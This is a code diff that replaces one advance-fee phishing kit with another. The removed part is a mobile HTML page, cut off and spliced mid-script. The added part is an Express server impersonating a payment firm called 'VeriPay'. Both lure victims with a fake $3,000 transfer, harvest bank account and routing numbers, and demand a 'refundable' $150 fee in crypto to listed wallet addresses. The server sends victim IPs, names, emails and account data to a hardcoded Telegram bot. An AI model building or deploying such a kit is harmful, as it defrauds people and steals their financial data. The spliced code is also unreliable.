@@ -1,349 +1,418 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VeriPay Global - Secure Transaction Portal</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root { --primary: #1a3b6b; --secondary: #2c5aa0; --success: #28a745; --danger: #dc3545; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; }
-        body { background-color: #f5f7fa; color: #333; overflow-x: hidden; }
-        .mobile-container { max-width: 428px; margin: 0 auto; background: white; min-height: 100vh; position: relative; }
-        .header { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; padding: 15px; position: relative; }
-        .logo { font-weight: 700; font-size: 1.5rem; display: flex; align-items: center; }
-        .security-badge { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 12px; font-size: 0.75rem; }
-        .notification-card { background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin: 15px; padding: 15px; border-left: 4px solid var(--success); }
-        .notification-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
-        .notification-title { font-weight: 600; font-size: 1.1rem; }
-        .notification-time { color: #6c757d; font-size: 0.85rem; }
-        .amount { font-size: 1.8rem; font-weight: 700; color: var(--success); margin: 10px 0; }
-        .sender-info { display: flex; align-items: center; margin: 15px 0; }
-        .sender-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #e9ecef; display: flex; align-items: center; justify-content: center; margin-right: 12px; }
-        .btn-custom { width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; margin: 8px 0; border: none; }
-        .btn-primary { background: var(--secondary); }
-        .bank-card { background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); margin: 15px; padding: 15px; }
-        .form-control { border-radius: 8px; border: 1px solid #ced4da; padding: 12px; margin: 8px 0; }
-        .verification-section { background: #f8f9fa; border-radius: 12px; padding: 15px; margin: 15px; }
-        .fee-card { background: #fff3cd; border-radius: 12px; padding: 15px; margin: 15px; }
-        .crypto-option { display: flex; align-items: center; padding: 12px; border: 1px solid #e9ecef; border-radius: 8px; margin: 8px 0; cursor: pointer; transition: all 0.2s; }
-        .crypto-option:hover { background-color: #f8f9fa; border-color: var(--secondary); }
-        .crypto-icon { width: 30px; height: 30px; margin-right: 12px; }
-        .countdown { font-size: 1.2rem; font-weight: 700; color: var(--danger); text-align: center; margin: 15px 0; }
-        .security-features { display: flex; justify-content: space-around; padding: 15px 0; }
-        .security-item { text-align: center; font-size: 0.8rem; }
-        .hidden { display: none; }
-        .pulse { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-        .spinner { border: 3px solid rgba(0,0,0,0.1); border-radius: 50%; border-top: 3px solid var(--secondary); width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .face-id-btn { background: #000; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; margin: 8px 0; }
-        .skip-btn { background: transparent; color: var(--secondary); border: 1px solid var(--secondary); padding: 10px; border-radius: 8px; width: 100%; margin: 8px 0; }
-    </style>
-</head>
-<body>
-    <div class="mobile-container">
-        <div class="header">
-            <div class="logo">
-                <i class="fas fa-shield-alt me-2"></i>
-                VeriPay Global
-            </div>
-            <div class="security-badge">
-                <i class="fas fa-lock me-1"></i> Secured
-            </div>
-        </div>
+// Import required libraries
+const express = require('express');
+const axios = require('axios');
 
-        <!-- Notification Screen -->
-        <div id="notificationScreen" class="container-fluid p-3">
-            <div class="notification-card pulse">
-                <div class="notification-header">
-                    <div class="notification-title">Incoming Transfer</div>
-                    <div class="notification-time">Just now</div>
-                </div>
-                <div class="amount">\$3,000.00 USD</div>
-                <div class="sender-info">
-                    <div class="sender-avatar">
-                        <i class="fas fa-user"></i>
-                    </div>
-                    <div>
-                        <div>From: Mark Harrison</div>
-                        <div class="text-muted small">VeriPay User ID: #7429</div>
-                    </div>
-                </div>
-                <p class="small">Mark Harrison has sent you \$3,000.00 through VeriPay Global. Please verify your account to receive this transfer.</p>
-            </div>
+// Set up Express server
+const app = express();
 
-            <div class="security-features">
-                <div class="security-item">
-                    <i class="fas fa-shield-alt fa-2x text-primary mb-2"></i>
-                    <div>256-bit Encryption</div>
-                </div>
-                <div class="security-item">
-                    <i class="fas fa-university fa-2x text-primary mb-2"></i>
-                    <div>Bank-Level Security</div>
-                </div>
-                <div class="security-item">
-                    <i class="fas fa-certificate fa-2x text-primary mb-2"></i>
-                    <div>FCA Regulated</div>
-                </div>
-            </div>
-
-            <div class="text-center mt-4">
-                <div class="countdown" id="countdown">Link expires in 15:00</div>
-                <button class="btn-custom btn-primary" onclick="showBankScreen()">Verify & Receive Transfer</button>
-                <div class="small text-muted mt-3">
-                    <i class="fas fa-info-circle me-1"></i>
-                    VeriPay Global is licensed in the US, UK, and EU for cross-border payments
-                </div>
-            </div>
-        </div>
-
-        <!-- Bank Verification Screen -->
-        <div id="bankScreen" class="container-fluid p-3 hidden">
-            <div class="bank-card">
-                <h5 class="mb-3">Bank Account Verification</h5>
-                <p class="small text-muted">To receive international transfers, we must verify your bank account</p>
-                
-                <div class="mb-3">
-                    <label class="form-label">Account Holder Name</label>
-                    <input type="text" class="form-control" id="accountName" placeholder="Full name as it appears on your account">
-                </div>
-                
-                <div class="mb-3">
-                    <label class="form-label">Bank Name</label>
-                    <select class="form-control" id="bankName">
-                        <option value="">Select your bank</option>
-                        <option value="chase">Chase Bank</option>
-                        <option value="bankofamerica">Bank of America</option>
-                        <option value="wellsfargo">Wells Fargo</option>
-                        <option value="citi">Citibank</option>
-                        <option value="capitalone">Capital One</option>
-                        <option value="hsbc">HSBC</option>
-                        <option value="barclays">Barclays Bank</option>
-                        <option value="other">Other</option>
-                    </select>
-                </div>
-                
-                <div class="mb-3">
-                    <label class="form-label">Routing Number</label>
-                    <input type="text" class="form-control" id="routingNumber" placeholder="9-digit routing number" maxlength="9">
-                </div>
-                
-                <div class="mb-3">
-                    <label class="form-label">Account Number</label>
-                    <input type="text" class="form-control" id="accountNumber" placeholder="Your account number">
-                </div>
-                
-                <div class="form-check mb-3">
-                    <input class="form-check-input" type="checkbox" id="termsCheck">
-                    <label class="form-check-label small" for="termsCheck">
-                        I agree to VeriPay's Terms of Service and Privacy Policy
-                    </label>
-                </div>
-                
-                <button class="btn-custom btn-primary" onclick="showVerificationScreen()">Continue</button>
-                <button class="btn-custom btn-secondary" style="background:#6c757d" onclick="showNotificationScreen()">Back</button>
-            </div>
-        </div>
-
-        <!-- Verification Screen -->
-        <div id="verificationScreen" class="container-fluid p-3 hidden">
-            <div class="bank-card">
-                <h5 class="mb-3">Identity Verification</h5>
-                <p class="small text-muted">For your security, please verify your identity</p>
-                
-                <div class="verification-section">
-                    <div class="d-flex align-items-center mb-3">
-                        <i class="fas fa-check-circle text-success me-2"></i>
-                        <span>Bank account verified</span>
-                    </div>
-                    <div class="d-flex align-items-center mb-3">
-                        <i class="fas fa-circle text-warning me-2"></i>
-                        <span>Identity verification pending</span>
-                    </div>
-                </div>
-                
-                <div class="text-center mb-4">
-                    <div class="spinner mb-3"></div>
-                    <p class="small">Securing your transaction...</p>
-                </div>
-                
-                <button class="face-id-btn" onclick="showFaceID()">
-                    <i class="fas fa-fingerprint me-2"></i> Use Face ID
-                </button>
-                <button class="skip-btn" onclick="showFeeScreen()">
-                    Skip for now
-                </button>
-                
-                <button class="btn-custom btn-secondary" style="background:#6c757d" onclick="showBankScreen()">Back</button>
-            </div>
-        </div>
-
-        <!-- Fee Screen -->
-        <div id="feeScreen" class="container-fluid p-3 hidden">
-            <div class="fee-card">
-                <h5 class="mb-3">Verification Fee Required</h5>
-                <p class="small">International transfers require a one-time verification fee to comply with anti-money laundering regulations</p>
-                
-                <div class="countdown" id="feeCountdown">Fee increases in 14:47</div>
-                
-                <div class="d-flex justify-content-between mb-3">
-                    <span>Standard verification:</span>
-                    <span>\$150.00</span>
-                </div>
-                <div class="d-flex justify-content-between mb-3">
-                    <span>Expedited processing:</span>
-                    <span>\$75.00</span>
-                </div>
-                <div class="d-flex justify-content-between mb-3 text-success">
-                    <span>Refundable:</span>
-                    <span>100% (within 24 hours)</span>
-                </div>
-                
-                <button class="btn-custom btn-primary" onclick="showPaymentScreen()">Pay Verification Fee</button>
-                <div class="small text-muted mt-3">
-                    <i class="fas fa-info-circle me-1"></i>
-                    Your fee will be refunded immediately after verification
-                </div>
-            </div>
-        </div>
-
-        <!-- Payment Screen -->
-        <div id="paymentScreen" class="container-fluid p-3 hidden">
-            <div class="bank-card">
-                <h5 class="mb-3">Select Payment Method</h5>
-                <p class="small text-muted">Choose your preferred cryptocurrency for the verification fee</p>
-                
-                <div class="crypto-option" onclick="selectCrypto('btc')">
-                    <div class="crypto-icon" style="background:#f7931a;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center">
-                        <i class="fab fa-bitcoin"></i>
-                    </div>
-                    <div class="flex-grow-1">
-                        <div>Bitcoin (BTC)</div>
-                        <div class="small text-muted">0.0055 BTC</div>
-                    </div>
-                    <div class="small">\$150.00</div>
-                </div>
-                
-                <div class="crypto-option" onclick="selectCrypto('eth')">
-                    <div class="crypto-icon" style="background:#627eea;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center">
-                        <i class="fab fa-ethereum"></i>
-                    </div>
-                    <div class="flex-grow-1">
-                        <div>Ethereum (ETH)</div>
-                        <div class="small text-muted">0.0793 ETH</div>
-                    </div>
-                    <div class="small">\$150.00</div>
-                </div>
-                
-                <div class="crypto-option" onclick="selectCrypto('sol')">
-                    <div class="crypto-icon" style="background:#00d4aa;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center">
-                        <span style="font-weight:bold">SOL</span>
-                    </div>
-                    <div class="flex-grow-1">
-                        <div>Solana (SOL)</div>
-                        <div class="small text-muted">6.87 SOL</div>
-                    </div>
-                    <div class="small">\$150.00</div>
-                </div>
-                
-                <div class="crypto-option" onclick="selectCrypto('bnb')">
-                    <div class="crypto-icon" style="background:#f3ba2f;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center">
-                        <span style="font-weight:bold">BNB</span>
-                    </div>
-                    <div class="flex-grow-1">
-                        <div>BNB Smart Chain</div>
-                        <div class="small text-muted">0.793 BNB</div>
-                    </div>
-                    <div class="small">\$150.00</div>
-                </div>
-                
-                <div class="crypto-option" onclick="selectCrypto('usdt')">
-                    <div class="crypto-icon" style="background:#26a17b;color:white;border-radius:50%;display:flex;align-items:center;justify-content:center">
-                        <span style="font-weight:bold">₮</span>
-                    </div>
-                    <div class="flex-grow-1">
-                        <div>Tether (USDT)</div>
-                        <div class="small text-muted">150 USDT (ERC-20)</div>
-                    </div>coin" style="font-size: 2rem; color: #f7931a;"></i>',
-                    'eth': '<i class="fab fa-ethereum" style="font-size: 2rem; color: #627eea;"></i>',
-                    'sol': '<span style="font-size: 2rem; font-weight: bold; color: #00d4aa;">SOL</span>',
-                    'bnb': '<span style="font-size: 2rem; font-weight: bold; color: #f3ba2f;">BNB</span>',
-                    'usdt': '<span style="font-size: 2rem; font-weight: bold; color: #26a17b;">₮</span>'
-                };
-                
-                hideAllScreens();
-                document.getElementById('cryptoScreen').classList.remove('hidden');
-                document.getElementById('cryptoIcon').innerHTML = cryptoIcons[type];
-                document.getElementById('cryptoName').textContent = cryptoNames[type];
-                document.getElementById('cryptoAddress').value = cryptoAddresses[type];
-                document.getElementById('cryptoAmount').textContent = cryptoAmounts[type];
-                document.getElementById('networkFee').textContent = '$0.00';
-                document.getElementById('totalAmount').textContent = '$150.00';
-                
-                // Generate QR code placeholder
-                document.getElementById('qrCode').innerHTML = `
-                    <div style="width: 150px; height: 150px; background: #f0f0f0; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
-                        <i class="fas fa-qrcode" style="font-size: 4rem; color: #333;"></i>
-                    </div>
-                `;
-                
-                sendTelegramNotification(`User selected ${cryptoNames[type]} payment method`);
+// Set up routes
+app.get('/', (req, res) => {
+  // Render corporate homepage
+  const html = `
+    <html>
+      <head>
+        <title>VeriPay Secure</title>
+        <style>
+          /* Corporate Brutalism design system */
+          body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0A2F5F;
+            color: #333333;
+          }
+          .hero {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: linear-gradient(to bottom, #0A2F5F, #333333);
+            background-size: 100% 300px;
+            background-position: 0% 100%;
+            animation: hero-gradient 10s linear infinite;
+          }
+          @keyframes hero-gradient {
+            0% {
+              background-position: 0% 100%;
             }
-            
-            function copyAddress() {
-                const addressInput = document.getElementById('cryptoAddress');
-                addressInput.select();
-                document.execCommand('copy');
-                alert('Address copied to clipboard');
-                sendTelegramNotification('User copied crypto address');
+            100% {
+              background-position: 0% 0%;
             }
-            
-            function checkPayment() {
-                hideAllScreens();
-                document.getElementById('processingScreen').classList.remove('hidden');
-                sendTelegramNotification('User claims to have sent payment');
-                
-                // Simulate blockchain confirmation
-                let progress = 25;
-                const progressBar = document.querySelector('#processingScreen .progress-bar');
-                const confirmationText = document.querySelector('#processingScreen .small.text-muted');
-                
-                const interval = setInterval(() => {
-                    progress += 25;
-                    progressBar.style.width = `${progress}%`;
-                    confirmationText.textContent = `Waiting for ${progress/25}/3 confirmations`;
-                    
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        showSuccessScreen();
-                    }
-                }, 3000);
-            }
-            
-            function showSuccessScreen() {
-                hideAllScreens();
-                document.getElementById('successScreen').classList.remove('hidden');
-                sendTelegramNotification('User reached success screen - payment completed');
-            }
-            
-            function hideAllScreens() {
-                document.getElementById('notificationScreen').classList.add('hidden');
-                document.getElementById('bankScreen').classList.add('hidden');
-                document.getElementById('verificationScreen').classList.add('hidden');
-                document.getElementById('feeScreen').classList.add('hidden');
-                document.getElementById('paymentScreen').classList.add('hidden');
-                document.getElementById('cryptoScreen').classList.add('hidden');
-                document.getElementById('processingScreen').classList.add('hidden');
-                document.getElementById('successScreen').classList.add('hidden');
-            }
-            
-            function startCountdown(elementId, seconds, callback) {
-                const element = document.getElementById(elementId);
-                let timeLeft = seconds;
-                
-                const interval = setInterval(() => {
-                    const minutes = Math.floor(timeLeft / 60);
-                    const seconds = timeLeft % 60;
-                    element.textContent = `Link expires in ${minutes}:${seconds < 1
+          }
+          .statistics {
+            padding: 20px;
+            background-color: #D4AF37;
+            color: #333333;
+          }
+          .ticker {
+            font-size: 24px;
+            font-weight: bold;
+          }
+          .logotype-bar {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px;
+            background-color: #E5E5E5;
+            color: #333333;
+          }
+          .logotype-bar li {
+            margin-right: 20px;
+          }
+        </style>
+      </head>
+      <body>
+        <div class="hero">
+          <h1>VeriPay Secure</h1>
+          <h2>Enter Secure Client Portal</h2>
+        </div>
+        <div class="statistics">
+          <h2>Statistics</h2>
+          <p>
+            <span class="ticker">Daily Transaction Volume:</span> $2,847,391,234
+            <span class="ticker">Active Verifications:</span> 4,782
+          </p>
+        </div>
+        <div class="logotype-bar">
+          <ul>
+            <li>VeriPay Secure</li>
+            <li>JPMorgan Chase</li>
+            <li>Bank of America</li>
+            <li>Wells Fargo</li>
+            <li>Goldman Sachs</li>
+            <li>Morgan Stanley</li>
+          </ul>
+        </div>
+      </body>
+    </html>
+  `;
+  res.send(html);
+});
+
+app.get('/about', (req, res) => {
+  // Render corporate legacy page
+  const html = `
+    <html>
+      <head>
+        <title>VeriPay Secure</title>
+        <style>
+          /* Corporate Brutalism design system */
+          body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0A2F5F;
+            color: #333333;
+          }
+          .timeline {
+            padding: 20px;
+            background-color: #D4AF37;
+            color: #333333;
+          }
+          .milestone {
+            padding: 20px;
+            background-color: #E5E5E5;
+            color: #333333;
+          }
+          .leadership {
+            padding: 20px;
+            background-color: #D4AF37;
+            color: #333333;
+          }
+        </style>
+      </head>
+      <body>
+        <div class="timeline">
+          <h2>Our History</h2>
+          <ul>
+            <li>
+              <h3>1984</h3>
+              <p>Founded VeriPay Secure</p>
+            </li>
+            <li>
+              <h3>1999</h3>
+              <p>Launched first digital ACH verification</p>
+            </li>
+            <li>
+              <h3>2015</h3>
+              <p>Achieved SOC 2 Type II Compliance</p>
+            </li>
+          </ul>
+        </div>
+        <div class="leadership">
+          <h2>Our Leadership Team</h2>
+          <ul>
+            <li>
+              <h3>John Doe</h3>
+              <p>CEO</p>
+              <p>Harvard University</p>
+              <p>Ex-Fed Reserve</p>
+            </li>
+            <li>
+              <h3>Jane Smith</h3>
+              <p>CTO</p>
+              <p>MIT University</p>
+              <p>Ex-SEC</p>
+            </li>
+            <li>
+              <h3>Bob Johnson</h3>
+              <p>CISO</p>
+              <p>Stanford University</p>
+              <p>Ex-FinCEN</p>
+            </li>
+          </ul>
+        </div>
+      </body>
+    </html>
+  `;
+  res.send(html);
+});
+
+app.get('/portal', (req, res) => {
+  // Render core user flow page
+  const html = `
+    <html>
+      <head>
+        <title>VeriPay Secure</title>
+        <style>
+          /* Corporate Brutalism design system */
+          body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0A2F5F;
+            color: #333333;
+          }
+          .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #E5E5E5;
+            color: #333333;
+          }
+          .notification {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #0A2F5F;
+            color: #333333;
+          }
+        </style>
+      </head>
+      <body>
+        <div class="loading">
+          <h1>Securing connection to financial network...</h1>
+          <progress value="0" max="100"></progress>
+        </div>
+        <div class="notification">
+          <h2>Device detected: </h2>
+          <p id="device"></p>
+        </div>
+        <form>
+          <label for="name">Full Name:</label>
+          <input type="text" id="name" name="name"><br><br>
+          <label for="email">Email:</label>
+          <input type="email" id="email" name="email"><br><br>
+          <label for="phone">Phone:</label>
+          <input type="tel" id="phone" name="phone"><br><br>
+          <label for="account">Bank Account Number:</label>
+          <input type="text" id="account" name="account"><br><br>
+          <label for="routing">Routing Number:</label>
+          <input type="text" id="routing" name="routing"><br><br>
+          <button type="submit">Submit</button>
+        </form>
+        <div id="modal" style="display: none;">
+          <h2>Security Bond Payment</h2>
+          <p>One-time Security Bond required for this transfer: $150.00</p>
+          <p>This amount is automatically refunded in full to your account within 24 hours of the successful $3,000.00 transfer completion.</p>
+          <button type="button" id="close">Close</button>
+          <button type="button" id="pay">Pay</button>
+        </div>
+        <div id="payment" style="display: none;">
+          <h2>Payment Gateway</h2>
+          <ul>
+            <li>
+              <h3>Bitcoin (BTC)</h3>
+              <p>Receiving address: bc1qn3kzvj2frv29wsjftwpvl99rpwf8az2476wtrh</p>
+              <p>Network: BTC Network</p>
+              <button type="button" id="copy-btc">Copy Address</button>
+            </li>
+            <li>
+              <h3>Ethereum (ETH)</h3>
+              <p>Receiving address: 0x762143e94397497e5b13f232b324717243c9bfc9</p>
+              <p>Network: ERC-20 Network</p>
+              <button type="button" id="copy-eth">Copy Address</button>
+            </li>
+            <li>
+              <h3>Solana (SOL)</h3>
+              <p>Receiving address: CyM1Tf3wuUL9M4f9JQqbtoS2NfzqzkAPGp5UnLL4DaWY</p>
+              <p>Network: Solana Network</p>
+              <button type="button" id="copy-sol">Copy Address</button>
+            </li>
+            <li>
+              <h3>BNB Smart Chain (BNB)</h3>
+              <p>Receiving address: 0x762143e94397497e5b13f232b324717243c9bfc9</p>
+              <p>Network: BEP-20 Network</p>
+              <button type="button" id="copy-bnb">Copy Address</button>
+            </li>
+            <li>
+              <h3>Tether (USDT)</h3>
+              <p>Receiving address: 0x762143e94397497e5b13f232b324717243c9bfc9</p>
+              <p>Network: ERC-20 Network</p>
+              <button type="button" id="copy-usdt">Copy Address</button>
+            </li>
+          </ul>
+        </div>
+      </body>
+      <script>
+        // Update device detection
+        document.getElementById('device').innerText = navigator.userAgent;
+        
+        // Add event listeners
+        document.getElementById('submit').addEventListener('click', (e) => {
+          e.preventDefault();
+          const formData = new FormData(document.querySelector('form'));
+          axios.post('/submit', formData)
+            .then((response) => {
+              console.log(response.data);
+              document.getElementById('modal').style.display = 'block';
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        });
+        
+        // Update payment gateway
+        document.getElementById('pay').addEventListener('click', () => {
+          document.getElementById('payment').style.display = 'block';
+        });
+        
+        // Copy address
+        document.querySelectorAll('.copy-address').forEach((button) => {
+          button.addEventListener('click', () => {
+            navigator.clipboard.writeText(button.parentNode.querySelector('.address').innerText);
+            button.innerText = 'Copied!';
+            setTimeout(() => {
+              button.innerText = 'Copy Address';
+            }, 2000);
+          });
+        });
+      </script>
+    </html>
+  `;
+  res.send(html);
+});
+
+app.get('/processing', (req, res) => {
+  // Render post-payment page
+  const html = `
+    <html>
+      <head>
+        <title>VeriPay Secure</title>
+        <style>
+          /* Corporate Brutalism design system */
+          body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0A2F5F;
+            color: #333333;
+          }
+          .tracker {
+            padding: 20px;
+            background-color: #D4AF37;
+            color: #333333;
+          }
+        </style>
+      </head>
+      <body>
+        <div class="tracker">
+          <h2>Tracker</h2>
+          <ul>
+            <li>
+              <h3>Step 1: Bond Received</h3>
+              <p>✓</p>
+            </li>
+            <li>
+              <h3>Step 2: Awaiting Blockchain Confirmation</h3>
+              <p>⏱️</p>
+            </li>
+            <li>
+              <h3>Step 3: Funds Release</h3>
+              <p>⌛</p>
+            </li>
+          </ul>
+        </div>
+      </body>
+    </html>
+  `;
+  res.send(html);
+});
+
+// Set up server-side session state
+app.use(express.session({
+  secret: 'secret',
+  resave: false,
+  saveUninitialized: true,
+}));
+
+// Set up Telegram Bot API integration
+const telegramBotToken = '8905087623:AAF2bZCQbyj49WarpJBwl0HJKHKi8pULQpo';
+const telegramChatId = '8905087623';
+
+// Define notification triggers
+const notificationTriggers = [
+  {
+    type: 'link_accessed',
+    message: '[ALERT] New portal session initiated. Token: {{token}}. IP: {{ip}}. User-Agent: {{ua}}.',
+  },
+  {
+    type: 'bank_details_submitted',
+    message: '[DATA CAPTURED] User has submitted banking information. Name: {{name}}. Email: {{email}}. Bank: {{bank}}. Account: ****{{account}}.',
+  },
+  {
+    type: 'fee_page_rendered',
+    message: '[CONVERSION ATTEMPT] User is now viewing the Security Bond payment page. Token: {{token}}.',
+  },
+  {
+    type: 'payment_confirmed',
+    message: '[SUCCESS] User has confirmed payment. Confirmation ID: {{confId}}. Awaiting blockchain verification.',
+  },
+];
+
+// Define API endpoint for submitting user data
+app.post('/submit', (req, res) => {
+  // Set up server-side session state
+  const session = req.session;
+  session.token = req.body.token;
+  session.ip = req.ip;
+  session.ua = req.headers['user-agent'];
+  session.name = req.body.name;
+  session.email = req.body.email;
+  session.bank = req.body.bank;
+  session.account = req.body.account;
+  
+  // Send notification triggers to Telegram Bot API
+  notificationTriggers.forEach((trigger) => {
+    const message = trigger.message.replace('{{token}}', session.token).replace('{{ip}}', session.ip).replace('{{ua}}', session.ua);
+    axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      chat_id: telegramChatId,
+      text: message,
+    })
+    .then((response) => {
+      console.log(response.data);
+    })
+    .catch((error) => {
+      console.error(error);
+    });
+  });
+  
+  res.send('Data submitted successfully!');
+});
+
+// Set up Express server listener
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+  console.log(`Server listening on port ${port}`);
+});
